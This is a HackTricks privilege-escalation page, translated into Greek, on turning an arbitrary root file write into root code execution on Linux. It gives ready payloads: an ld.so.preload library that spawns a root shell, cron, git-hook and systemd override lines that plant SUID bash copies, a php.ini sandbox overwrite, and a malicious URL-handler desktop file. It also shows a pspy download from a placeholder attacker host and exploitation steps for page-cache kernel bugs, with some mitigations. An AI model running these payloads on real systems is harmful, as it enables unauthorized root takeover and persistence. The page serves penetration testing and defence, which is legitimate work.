# Αυθαίρετη εγγραφή αρχείων ως root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Αυτό το αρχείο λειτουργεί όπως η μεταβλητή περιβάλλοντος **`LD_PRELOAD`**, αλλά λειτουργεί επίσης σε **SUID binaries**.\
Αν μπορείτε να το δημιουργήσετε ή να το τροποποιήσετε, μπορείτε απλώς να προσθέσετε μια **διαδρομή προς μια βιβλιοθήκη που θα φορτώνεται** με κάθε binary που εκτελείται.

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

Τα [**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) είναι **scripts** που **εκτελούνται** σε διάφορα **events** σε ένα git repository, όπως όταν δημιουργείται ένα commit, ένα merge... Επομένως, αν ένα **privileged script ή user** εκτελεί συχνά αυτές τις **ενέργειες** και υπάρχει δυνατότητα **εγγραφής στον φάκελο `.git`**, αυτό μπορεί να χρησιμοποιηθεί για **privesc**.

Για παράδειγμα, είναι δυνατό να **δημιουργηθεί ένα script** σε ένα git repo μέσα στο **`.git/hooks`**, ώστε να εκτελείται πάντα όταν δημιουργείται ένα νέο commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Αρχεία Cron και χρονισμού

Αν μπορείτε να **γράψετε σε αρχεία που σχετίζονται με το cron και εκτελούνται από το root**, συνήθως μπορείτε να πετύχετε εκτέλεση κώδικα την επόμενη φορά που θα εκτελεστεί η εργασία. Ενδιαφέροντες στόχοι περιλαμβάνουν:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Το crontab του ίδιου του root στο `/var/spool/cron/` ή στο `/var/spool/cron/crontabs/`
- `systemd` timers και τα services που ενεργοποιούν

Γρήγοροι έλεγχοι:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Τυπικές διαδρομές abuse:

- **Προσθήκη ενός νέου root cron job** στο `/etc/crontab` ή σε ένα αρχείο στο `/etc/cron.d/`
- **Αντικατάσταση ενός script** που εκτελείται ήδη από το `run-parts`
- **Backdoor σε έναν υπάρχοντα timer target** με τροποποίηση του script ή του binary που εκκινεί

Minimal cron payload example:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Αν μπορείτε να γράψετε μόνο μέσα σε έναν κατάλογο cron που χρησιμοποιείται από το `run-parts`, τοποθετήστε εκεί ένα εκτελέσιμο αρχείο:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Σημειώσεις:

- Το `run-parts` συνήθως αγνοεί filenames που περιέχουν τελείες, επομένως προτιμήστε ονόματα όπως `backup` αντί για `backup.sh`.
- Ορισμένα distros χρησιμοποιούν `anacron` ή timers του `systemd` αντί για το κλασικό cron, αλλά η ιδέα του abuse είναι η ίδια: **τροποποιήστε αυτό που θα εκτελέσει αργότερα ο root**.

### Αρχεία Service & Socket

Αν μπορείτε να γράψετε **`systemd` unit files** ή αρχεία που αναφέρονται από αυτά, ενδέχεται να μπορείτε να επιτύχετε code execution ως root, κάνοντας reload και restart του unit ή περιμένοντας να ενεργοποιηθεί η διαδρομή ενεργοποίησης του service/socket.

Ενδιαφέροντες στόχοι περιλαμβάνουν:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides στο `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries που αναφέρονται από τα `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable paths του `EnvironmentFile=` που φορτώνονται από ένα root service

Γρήγοροι έλεγχοι:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Συνηθισμένες διαδρομές abuse:

- **Overwrite `ExecStart=`** σε ένα root-owned service unit που μπορείς να τροποποιήσεις
- **Πρόσθεσε ένα drop-in override** με κακόβουλο `ExecStart=` και κάνε πρώτα clear το παλιό
- **Κάνε backdoor το script/binary** που αναφέρεται ήδη από το unit
- **Κάνε hijack ένα socket-activated service** τροποποιώντας το αντίστοιχο αρχείο `.service` που εκκινείται όταν το socket λάβει μια σύνδεση

Παράδειγμα κακόβουλου override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Τυπική ροή ενεργοποίησης:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Εάν δεν μπορείτε να επανεκκινήσετε οι ίδιοι τα services, αλλά μπορείτε να επεξεργαστείτε μια socket-activated unit, ίσως χρειάζεται απλώς να **περιμένετε μια σύνδεση client** για να ενεργοποιηθεί η εκτέλεση του backdoored service ως root.

### Overwrite ενός restrictive `php.ini` που χρησιμοποιείται από ένα privileged PHP sandbox

Ορισμένα custom daemons επικυρώνουν PHP που παρέχεται από τον χρήστη, εκτελώντας το `php` με ένα **περιορισμένο `php.ini`** (για παράδειγμα, `disable_functions=exec,system,...`). Εάν ο κώδικας μέσα στο sandbox εξακολουθεί να διαθέτει **οποιοδήποτε write primitive** (όπως `file_put_contents`) και μπορείτε να αποκτήσετε πρόσβαση στο **ακριβές path του `php.ini`** που χρησιμοποιεί το daemon, μπορείτε να **overwrite αυτό το config** για να άρετε τους περιορισμούς και έπειτα να υποβάλετε ένα δεύτερο payload που εκτελείται με elevated privileges.

Τυπική ροή:

1. Το πρώτο payload κάνει overwrite το config του sandbox.
2. Το δεύτερο payload εκτελεί κώδικα, τώρα που τα dangerous functions έχουν ενεργοποιηθεί ξανά.

Minimal example (αντικαταστήστε το path που χρησιμοποιεί το daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Αν το daemon εκτελείται ως root (ή επικυρώνει χρησιμοποιώντας διαδρομές που ανήκουν στον root), η δεύτερη εκτέλεση εκτελείται σε root context. Αυτό είναι ουσιαστικά **privilege escalation μέσω overwrite του config**, όταν το sandboxed runtime μπορεί ακόμη να γράφει αρχεία.

### binfmt_misc

Το αρχείο που βρίσκεται στο `/proc/sys/fs/binfmt_misc` υποδεικνύει ποιο binary πρέπει να εκτελεί ποιον τύπο αρχείων. TODO: έλεγχος των απαιτήσεων για την abuse αυτής της λειτουργίας, ώστε να εκτελείται ένα rev shell όταν ανοίγει ένας συνηθισμένος τύπος αρχείου.

### Overwrite schema handlers (όπως http: ή https:)

Ένας attacker με δικαιώματα εγγραφής στους configuration directories ενός victim μπορεί εύκολα να αντικαταστήσει ή να δημιουργήσει αρχεία που αλλάζουν τη συμπεριφορά του συστήματος, με αποτέλεσμα unintended code execution. Τροποποιώντας το αρχείο `$HOME/.config/mimeapps.list` ώστε να αντιστοιχίσει τους HTTP και HTTPS URL handlers σε ένα malicious αρχείο (π.χ. ορίζοντας `x-scheme-handler/http=evil.desktop`), ο attacker διασφαλίζει ότι **κάθε κλικ σε σύνδεσμο http ή https ενεργοποιεί τον κώδικα που καθορίζεται σε εκείνο το `evil.desktop` αρχείο**. Για παράδειγμα, αφού τοποθετήσει τον παρακάτω malicious κώδικα στο `evil.desktop` μέσα στο `$HOME/.local/share/applications`, κάθε εξωτερικό URL click εκτελεί την ενσωματωμένη εντολή:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Για περισσότερες πληροφορίες, δείτε [**αυτήν την ανάρτηση**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), όπου χρησιμοποιήθηκε για την εκμετάλλευση μιας πραγματικής ευπάθειας.

### Το Root εκτελεί scripts/binaries στα οποία μπορεί να γράψει ο χρήστης

Αν μια προνομιούχα ροή εργασίας εκτελεί κάτι όπως `/bin/sh /home/username/.../script` (ή οποιοδήποτε binary μέσα σε έναν κατάλογο που ανήκει σε μη προνομιούχο χρήστη), μπορείτε να το hijack:

- **Εντοπισμός της εκτέλεσης:** παρακολουθήστε τις διεργασίες με το [pspy](https://github.com/DominicBreuker/pspy), για να εντοπίσετε το Root να καλεί paths που ελέγχονται από τον χρήστη:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Επιβεβαίωση δυνατότητας εγγραφής:** βεβαιωθείτε ότι τόσο το target file όσο και ο κατάλογός του ανήκουν στον χρήστη σας ή είναι writable από αυτόν.
- **Hijack του target:** κρατήστε backup του αρχικού binary/script και τοποθετήστε ένα payload που δημιουργεί ένα SUID shell (ή οποιαδήποτε άλλη ενέργεια ως root) και, στη συνέχεια, επαναφέρετε τα permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (π.χ. πατώντας ένα UI button που κάνει spawn το helper). Όταν το root εκτελέσει ξανά το hijacked path, πάρε το escalated shell με `./rootshell -p`.

### Τροποποίηση privileged binaries μόνο στο page cache

Ορισμένα kernel bugs δεν τροποποιούν το file **στο disk**. Αντίθετα, σου επιτρέπουν να τροποποιήσεις μόνο το αντίγραφο ενός readable file στο **page cache**. Αν μπορείς να στοχεύσεις ένα **setuid** ή γενικά **root-executed** binary, η επόμενη εκτέλεση μπορεί να τρέξει attacker-controlled bytes από τη μνήμη και να κάνει privilege escalation, παρότι το file hash στο disk παραμένει αμετάβλητο.

Αυτό είναι χρήσιμο να το αντιμετωπίζεις ως ένα **runtime-only file write primitive**:

- **Το disk παραμένει καθαρό**: το inode και τα bytes στο disk δεν αλλάζουν
- **Η μνήμη είναι dirty**: οι processes που διαβάζουν ή εκτελούν το cached page λαμβάνουν το attacker-modified περιεχόμενο
- **Το effect είναι προσωρινό**: η αλλαγή εξαφανίζεται μετά από reboot ή cache eviction

Αυτό το primitive βρίσκεται ανάμεσα στο κλασικό **arbitrary file write** και σε παλαιότερα bugs εκμετάλλευσης του **page cache**, όπως τα Dirty COW / Dirty Pipe:

- Το Dirty COW βασιζόταν σε race
- Το Dirty Pipe είχε περιορισμούς στη θέση εγγραφής
- Ένα page-cache-only primitive μπορεί να είναι πιο reliable αν το vulnerable path παρέχει direct writes σε cached file-backed pages

#### Generic privesc flow

1. Απόκτησε ένα kernel primitive που μπορεί να γράψει σε **file-backed page cache pages**
2. Χρησιμοποίησέ το εναντίον ενός **readable privileged binary** ή άλλου root-executed file
3. Κάνε trigger την εκτέλεση **πριν** γίνει eviction του page από το cache
4. Απόκτησε code execution ως root, ενώ το file στο disk εξακολουθεί να φαίνεται μη τροποποιημένο

Typical high-value targets:

- **setuid-root** binaries
- Helpers που εκκινούνται από **root services**
- Binaries που εκτελούνται συχνά από **containers sharing the host kernel/page cache**

#### AF_ALG + `splice()` example path

Το Copy Fail (CVE-2026-31431) είναι καλό example αυτής της class. Το vulnerable path βρισκόταν στο Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- Το `splice()` μπορεί να μεταφέρει references σε page-cache pages από ένα readable file στο crypto TX scatterlist
- Το in-place `algif_aead` decrypt path επαναχρησιμοποιούσε τα source και destination buffers
- Το `authencesn` στη συνέχεια έγραφε στην περιοχή του destination tag
- όταν αυτή η περιοχή εξακολουθούσε να αναφέρεται σε spliced file-backed pages, η εγγραφή κατέληγε στο **page cache του target file**

Επομένως, η ενδιαφέρουσα τεχνική δεν είναι το ίδιο το CVE, αλλά το pattern:

- **feed file-backed cache pages σε ένα kernel subsystem**
- κάνε το subsystem να τις **χειριστεί ως writable output**
- κάνε trigger ένα μικρό controlled overwrite στη μνήμη

Το public PoC χρησιμοποίησε επαναλαμβανόμενες **4-byte writes** για να κάνει patch το `/usr/bin/su` στη μνήμη και στη συνέχεια το εκτέλεσε.

#### ESP / XFRM + netfilter TEE clone example path

Το DirtyClone (CVE-2026-43503) παρουσιάζει άλλη μία παραλλαγή του ίδιου **page-cache-only write-to-root** pattern, αλλά αυτή τη φορά το sink είναι το **IPsec ESP decrypt** αντί για το `AF_ALG`.

Η σημαντική τεχνική είναι το **metadata-laundering step**:

- Το `splice()` τοποθετεί ένα **read-only file-backed page-cache page** σε ένα ESP-in-UDP packet
- Το αρχικό DirtyFrag mitigation έκανε tag το skb με `SKBFL_SHARED_FRAG`, ώστε το `esp_input()` να κάνει **copy πριν από το decrypt**
- Το netfilter `TEE` κάνει duplicate το packet μέσω των `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- Το clone διατηρεί το **ίδιο physical page-cache reference**, αλλά χάνει το `SKBFL_SHARED_FRAG`
- Το `esp_input()` θεωρεί τότε το clone safe και εκτελεί **in-place `cbc(aes)` decrypt** πάνω στο file-backed page

Επομένως, το lesson για τον reviewer είναι ευρύτερο από το ίδιο το CVE: αν ένα mitigation βασίζεται σε **skb/page metadata** για να αποφασίσει αν μια operation πρέπει πρώτα να κάνει copy, οποιοδήποτε **clone/copy path που διατηρεί το backing page αλλά αφαιρεί το metadata** μπορεί σιωπηρά να ανοίξει ξανά το write primitive.

Typical exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` για να αποκτήσεις **`CAP_NET_ADMIN` μέσα σε ένα private network namespace**
2. κάνε bring up το loopback και εγκατέστησε ένα **netfilter `TEE` rule** στο `mangle/OUTPUT`
3. εγκατέστησε **XFRM ESP transport SAs** μέσω `NETLINK_XFRM`
4. κωδικοποίησε κάθε target 4-byte word στο πεδίο `seq_hi` του SA (το word-selection trick του DirtyFrag)
5. στείλε το spliced ESP-in-UDP packet, ώστε το **TEE clone** να φτάσει στο `esp_input()` και να κάνει decrypt **in place**
6. επανέλαβε μέχρι το page-cache copy του `/usr/bin/su` ή κάποιου άλλου privileged executable να περιέχει attacker-controlled code

Σε operational επίπεδο, το impact είναι ίδιο με το `AF_ALG` example: το file στο disk παραμένει καθαρό, αλλά το `execve()` καταναλώνει τα **mutated page-cache bytes** και δίνει root.

Χρήσιμοι exposure checks για αυτή την παραλλαγή:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Η βραχυπρόθεσμη μείωση της επιφάνειας επίθεσης είναι και εδώ ειδική για κάθε path: η αναβάθμιση σε kernel που περιέχει το `48f6a5356a33` διορθώνει το clone path, ενώ ο αποκλεισμός του autoload του `xt_TEE` αφαιρεί το **flag-laundering step** και ο αποκλεισμός των `esp4` / `esp6` αφαιρεί το **decrypt sink**.

#### Έκθεση και αναζήτηση

Αν υποψιάζεστε αυτή την κατηγορία bug, μην βασίζεστε μόνο στους ελέγχους ακεραιότητας του δίσκου. Επαληθεύστε επίσης:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: το `algif_aead` μπορεί να φορτωθεί/εκφορτωθεί ως module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: το interface είναι ενσωματωμένο στον kernel
- τα setuid binaries είναι καλοί στόχοι, επειδή ένα page-cache-only patch μπορεί να αρκεί για τη μετατροπή ενός local foothold σε root

#### Μείωση της επιφάνειας επίθεσης για το path `algif_aead`

Εάν το ευάλωτο interface παρέχεται από ένα φορτώσιμο module:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Εάν έχει γίνει compile στον kernel, έχουν αναφερθεί ορισμένα disclosures που μπλοκάρουν το init path με:
```bash
initcall_blacklist=algif_aead_init
```
Αυτού του είδους η mitigation αξίζει να τη θυμόμαστε και για άλλα kernel LPEs: αν η exploitation εξαρτάται από ένα συγκεκριμένο optional interface, η απενεργοποίηση ή το blacklisting αυτού του interface μπορεί να διακόψει το exploit path ακόμη και πριν γίνει διαθέσιμο ένα πλήρες kernel upgrade.

## Αναφορές

- [HTB Bamboo – hijacking ενός script που εκτελείται ως root σε έναν κατάλογο PaperCut με δυνατότητα εγγραφής από τον χρήστη](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Συχνές ερωτήσεις για το Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Αποκάλυψη του Openwall oss-security για το CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Επαναφορά της λειτουργίας out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Ανακοίνωση του Copy Fail](https://copy.fail/)
- [Τεχνική ανάλυση των Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [Repository / README του DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: Ανάλυση και exploitation του Linux LPE variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux fix: net: skb: διατήρηση του `SKBFL_SHARED_FRAG` στο `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Προγενέστερη Linux mitigation: ορισμός του `SKBFL_SHARED_FRAG` για spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
